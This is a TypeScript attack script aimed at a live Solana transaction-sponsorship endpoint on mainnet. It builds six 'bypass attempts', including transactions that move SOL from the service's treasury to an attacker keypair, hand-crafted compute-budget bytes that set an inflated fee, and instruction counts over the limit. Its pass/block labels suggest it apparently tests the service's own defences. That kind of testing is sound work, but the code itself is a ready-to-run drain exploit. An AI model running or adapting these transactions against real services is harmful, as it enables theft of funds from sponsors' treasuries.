import { Connection, Transaction, PublicKey, Keypair, TransactionInstruction, SystemProgram, ComputeBudgetProgram } from "@solana/web3.js";

const SHADOWSPACE = new PublicKey("EEnouVLAoQGMEbrypEhP3Ct5RgCViCWG4n1nCZNwMxjQ");

async function attack(name: string, buildTx: (treasury: PublicKey, attacker: Keypair, blockhash: string) => Transaction) {
  const res = await fetch("https://www.shyft.lol/api/sponsor-tx");
  const { treasuryPubkey } = await res.json();
  const treasury = new PublicKey(treasuryPubkey);
  const attacker = Keypair.generate();
  const connection = new Connection("https://api.mainnet-beta.solana.com");
  const { blockhash } = await connection.getLatestBlockhash();

  const tx = buildTx(treasury, attacker, blockhash);
  tx.partialSign(attacker);

  const attackRes = await fetch("https://www.shyft.lol/api/sponsor-tx", {
    method: "POST",
    headers: { "Content-Type": "application/json", "Origin": "https://www.shyft.lol" },
    body: JSON.stringify({
      transaction: tx.serialize({ requireAllSignatures: false }).toString("base64"),
      walletAddress: attacker.publicKey.toBase58(),
    }),
  });
  const result = await attackRes.json();
  const status = attackRes.status === 200 ? "🚨 PASSED" : `✅ BLOCKED (${attackRes.status})`;
  console.log(`${status} | ${name} | ${result.error || result.signature || ""}`);
  
  // Rate limit cooldown
  await new Promise(r => setTimeout(r, 15000));
}

async function main() {
  console.log("=== BYPASS ATTEMPT 1: Direct SystemProgram Transfer from treasury ===");
  await attack("SystemProgram.Transfer treasury→attacker", (treasury, attacker, blockhash) => {
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: treasury });
    tx.add(SystemProgram.transfer({ fromPubkey: treasury, toPubkey: attacker.publicKey, lamports: 1_000_000_000 }));
    tx.add(new TransactionInstruction({ programId: SHADOWSPACE, keys: [{ pubkey: attacker.publicKey, isWritable: true, isSigner: true }], data: Buffer.alloc(8) }));
    return tx;
  });

  console.log("\n=== BYPASS ATTEMPT 2: ComputeUnitPrice at exactly the cap (100000) ===");
  await attack("ComputeUnitPrice=100000 (at cap)", (treasury, attacker, blockhash) => {
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: treasury });
    tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
    tx.add(new TransactionInstruction({ programId: SHADOWSPACE, keys: [{ pubkey: attacker.publicKey, isWritable: true, isSigner: true }], data: Buffer.alloc(8) }));
    return tx;
  });

  console.log("\n=== BYPASS ATTEMPT 3: ComputeUnitPrice at 100001 (just over cap) ===");
  await attack("ComputeUnitPrice=100001 (over cap)", (treasury, attacker, blockhash) => {
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: treasury });
    tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_001 }));
    tx.add(new TransactionInstruction({ programId: SHADOWSPACE, keys: [{ pubkey: attacker.publicKey, isWritable: true, isSigner: true }], data: Buffer.alloc(8) }));
    return tx;
  });

  console.log("\n=== BYPASS ATTEMPT 4: Raw ComputeBudget with hand-crafted bytes ===");
  await attack("Hand-crafted ComputeBudget bytes (type=3, price=999999999999)", (treasury, attacker, blockhash) => {
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: treasury });
    // Manually craft SetComputeUnitPrice instruction: type byte 3 + 8 byte LE u64
    const data = Buffer.alloc(9);
    data[0] = 3; // SetComputeUnitPrice
    data.writeBigUInt64LE(BigInt("999999999999"), 1);
    tx.add(new TransactionInstruction({
      programId: new PublicKey("ComputeBudget111111111111111111111111111111"),
      keys: [],
      data,
    }));
    tx.add(new TransactionInstruction({ programId: SHADOWSPACE, keys: [{ pubkey: attacker.publicKey, isWritable: true, isSigner: true }], data: Buffer.alloc(8) }));
    return tx;
  });

  console.log("\n=== BYPASS ATTEMPT 5: No Shadowspace instruction (pure drain) ===");
  await attack("No Shadowspace ix, just SystemProgram transfer", (treasury, attacker, blockhash) => {
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: treasury });
    tx.add(SystemProgram.transfer({ fromPubkey: treasury, toPubkey: attacker.publicKey, lamports: 500_000_000 }));
    return tx;
  });

  console.log("\n=== BYPASS ATTEMPT 6: 7 instructions (over limit) ===");
  await attack("7 instructions (over max 6)", (treasury, attacker, blockhash) => {
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: treasury });
    for (let i = 0; i < 7; i++) {
      tx.add(new TransactionInstruction({ programId: SHADOWSPACE, keys: [{ pubkey: attacker.publicKey, isWritable: true, isSigner: true }], data: Buffer.alloc(8) }));
    }
    return tx;
  });

  console.log("\nDone — all bypass attempts finished.");
}

main().catch(console.error);
